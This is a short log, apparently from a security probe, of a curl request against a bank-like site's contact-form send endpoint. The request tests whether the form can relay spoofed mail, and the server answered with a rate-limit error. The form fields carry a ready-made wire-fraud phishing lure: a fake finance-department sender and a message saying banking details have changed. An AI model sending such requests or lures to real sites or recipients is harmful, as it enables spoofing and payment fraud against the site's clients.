@@ -1,0 +1,13 @@
+# command: cd /work/evidence && echo "### T7: full attacker-controlled content: display name, subject, body" && curl -sS -o t7.out -w "HTTP=%{http_code}\n" -X POST https://www.infinitycapital.bh/api/send -F "fname=Verify" -F "lname=Test" -F "areacode=973" -F "tel=0000000" --form-string "cname=\"Infinity Capital — Treasury & Finance Dept\"" --form-string "subject=URGENT: Wire transfer confirmation required — see attached" --form-string "msg=Dear valued client, our banking details have changed. Please confirm the new account by replying to this message. Regards, Finance Team, Infinity Capital" -F "check=x" --form-string "targets=probe-relay-verify-03@guardrailcheck.invalid"; echo "body:"; cat t7.out; echo
+# tool: curl
+# exit_code: 0
+# ts: 2026-09-30T12:06:06.637832+00:00
+# ---
+
+### T7: full attacker-controlled content: display name, subject, body
+HTTP=429
+body:
+Too Many Requests
+
+Too Many Requests
+bom1::9d5q7-1790769966612-ef41abb8fb2d
